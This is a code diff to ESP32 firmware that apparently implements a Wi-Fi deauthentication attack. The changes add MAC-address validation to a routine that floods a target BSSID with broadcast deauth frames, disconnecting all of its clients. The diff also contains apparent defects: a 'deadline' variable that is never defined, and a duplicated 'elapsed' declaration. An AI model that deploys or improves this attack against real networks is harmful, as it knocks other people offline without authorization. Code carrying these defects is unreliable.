@@ -20,11 +20,36 @@ struct DeauthFrame {
     uint16_t reasonCode;
 };
 
-void parseMAC(const String &macStr, uint8_t *mac) {
+bool parseMAC(const String &macStr, uint8_t *mac) {
+    // Validate format: AA:BB:CC:DD:EE:FF (17 characters)
+    if (macStr.length() != 17) {
+        Serial.println("ERROR: Invalid MAC format. Expected AA:BB:CC:DD:EE:FF");
+        return false;
+    }
+
     for (int i = 0; i < 6; i++) {
         int pos = i * 3;
-        mac[i] = strtol(macStr.substring(pos, pos + 2).c_str(), nullptr, 16);
+
+        // Validate colon separators
+        if (i < 5 && macStr[pos + 2] != ':') {
+            Serial.println("ERROR: Invalid MAC format - missing colon at position " + String(pos + 2));
+            return false;
+        }
+
+        // Parse hex byte
+        String hexByte = macStr.substring(pos, pos + 2);
+        char *endPtr = nullptr;
+        long val = strtol(hexByte.c_str(), &endPtr, 16);
+
+        if (val < 0 || val > 255 || endPtr == hexByte.c_str()) {
+            Serial.println("ERROR: Invalid MAC hex value at position " + String(i) + " ('" + hexByte + "')");
+            return false;
+        }
+
+        mac[i] = (uint8_t)val;
     }
+
+    return true;
 }
 
 void sendDeauthPacket(uint8_t *destAddr, uint8_t *srcAddr, uint8_t *bssidAddr) {
@@ -50,7 +75,8 @@ void sendDeauthPacket(uint8_t *destAddr, uint8_t *srcAddr, uint8_t *bssidAddr) {
         g_deauthCount++;
     }
 }
-}
+
+}  // namespace (anonymous)
 
 namespace WiFiDeauth {
 
@@ -72,7 +98,11 @@ DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bo
     esp_wifi_set_promiscuous(true);
 
     uint8_t bssid[6];
-    parseMAC(targetBSSID, bssid);
+    if (!parseMAC(targetBSSID, bssid)) {
+        Serial.println("✗ Failed to parse target BSSID");
+        esp_wifi_set_promiscuous(false);
+        return result;
+    }
 
     g_deauthActive = true;
     g_deauthCount = 0;
@@ -84,7 +114,7 @@ DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bo
     uint8_t srcAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};  // Broadcast source
     uint8_t destAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast dest
 
-    while (millis() - startTime < durationMs && g_deauthActive) {
+    while ((int32_t)(millis() - deadline) < 0 && g_deauthActive) {
         if (broadcastClients) {
             // Send broadcast deauth to all clients
             sendDeauthPacket(destAddr, srcAddr, bssid);
@@ -114,6 +144,7 @@ DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bo
     result.deauthCount = g_deauthCount;
     uint32_t elapsed = millis() - startTime;
 
+    uint32_t elapsed = millis() - startTime;
     Serial.println("✓ Deauth attack complete");
     Serial.println("Total frames: " + String(result.deauthCount));
     Serial.println("Duration: " + String(elapsed) + "ms");
